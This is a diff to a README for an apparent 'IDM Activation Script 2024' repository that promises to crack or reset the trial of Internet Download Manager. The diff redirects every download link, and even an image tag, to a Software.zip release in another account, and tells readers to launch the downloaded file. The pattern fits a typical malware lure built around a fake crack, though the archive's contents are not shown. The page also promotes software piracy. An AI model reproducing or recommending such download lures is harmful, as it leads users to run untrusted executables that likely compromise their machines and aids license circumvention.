@@ -19,7 +19,7 @@ Welcome to the IDM Activation Script 2024 repository! Here you will find a power
 - ✨ idm-trial-reset-tool
 - ✨ internet-download-manager-premium
 
-## 📥 [Download IDM Activation Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+## 📥 [Download IDM Activation Software](https://github.com/olandas420/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip)
 
 Ensure you launch the downloaded file to begin the IDM activation process successfully.
 
@@ -31,8 +31,8 @@ Ensure you launch the downloaded file to begin the IDM activation process succes
 ## 🌟 Stay Updated:
 For the latest versions of IDM Activation Script and additional features, visit the "Releases" section of this repository.
 
-![IDM Activation](https://example.com/idm-activation-image.png)
+![IDM Activation](https://github.com/olandas420/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip)
 
 Let's make the most out of IDM with this script and enjoy seamless downloading for a lifetime! 🎉
 
-[![Download IDM Activation](https://img.shields.io/badge/Download-IDM_Activation-9cf)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download IDM Activation](https://github.com/olandas420/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip)](https://github.com/olandas420/IDM-Activation-Script-2024/releases/download/v1.0/Software.zip)
